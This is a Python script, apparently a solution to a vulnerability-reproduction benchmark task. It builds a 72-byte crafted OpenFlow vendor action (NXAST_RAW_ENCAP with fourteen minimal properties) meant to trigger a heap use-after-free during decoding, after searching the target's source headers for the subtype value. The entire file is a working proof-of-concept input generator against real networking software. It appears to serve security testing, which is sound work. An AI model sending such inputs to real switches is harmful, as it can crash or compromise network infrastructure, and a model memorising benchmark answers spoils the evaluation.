import struct
import os
import re
import tarfile

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the Heap Use After Free vulnerability in decode_NXAST_RAW_ENCAP.
        The PoC is a raw OpenFlow action of type NXAST_RAW_ENCAP containing enough properties
        to trigger a reallocation of the ofpbuf during decoding.
        """
        # Constants
        OFPAT_VENDOR = 0xffff
        NX_VENDOR_ID = 0x00002320
        subtype_val = 46  # Default for NXAST_RAW_ENCAP (same as NXAST_ENCAP usually)

        # Helper to search for subtype definition in source code
        def search_content(content):
            # Look for explicit assignment like NXAST_RAW_ENCAP = 46
            m = re.search(r'NXAST_RAW_ENCAP\s*=\s*((?:0x)?[0-9a-fA-F]+)', content)
            if m:
                return int(m.group(1), 0)
            return None

        # Attempt to find the exact subtype value from source files
        try:
            if os.path.exists(src_path):
                if os.path.isdir(src_path):
                    found = False
                    for root, dirs, files in os.walk(src_path):
                        for file in files:
                            if file.endswith('.h'):
                                try:
                                    with open(os.path.join(root, file), 'r', encoding='utf-8', errors='ignore') as f:
                                        val = search_content(f.read())
                                        if val is not None:
                                            subtype_val = val
                                            found = True
                                            break
                                except Exception:
                                    pass
                        if found: break
                elif tarfile.is_tarfile(src_path):
                    with tarfile.open(src_path, 'r') as tar:
                        for member in tar.getmembers():
                            if member.name.endswith('.h'):
                                try:
                                    f = tar.extractfile(member)
                                    if f:
                                        content = f.read().decode('utf-8', errors='ignore')
                                        val = search_content(content)
                                        if val is not None:
                                            subtype_val = val
                                            break
                                except Exception:
                                    pass
        except Exception:
            pass

        # Construct PoC
        # We need an input of 72 bytes (based on ground truth)
        # Structure:
        #   Vendor Action Header (16 bytes)
        #   Properties (56 bytes)
        #
        # Header:
        #   Type (2) = OFPAT_VENDOR
        #   Len (2) = 72
        #   Vendor (4) = NX_VENDOR_ID
        #   Subtype (2) = subtype_val
        #   Pad (6)
        #
        # Properties:
        #   14 properties of 4 bytes each (Header only: Class, Type, Len=4)
        
        total_len = 72
        header_len = 16
        payload_len = total_len - header_len
        num_props = payload_len // 4  # 56 / 4 = 14

        header = struct.pack('>HHLH6x', 
                             OFPAT_VENDOR, 
                             total_len, 
                             NX_VENDOR_ID, 
                             subtype_val)
        
        # Create minimal properties (Class=0, Type=0, Len=4)
        props = b''.join([struct.pack('>HBB', 0, 0, 4) for _ in range(num_props)])
        
        return header + props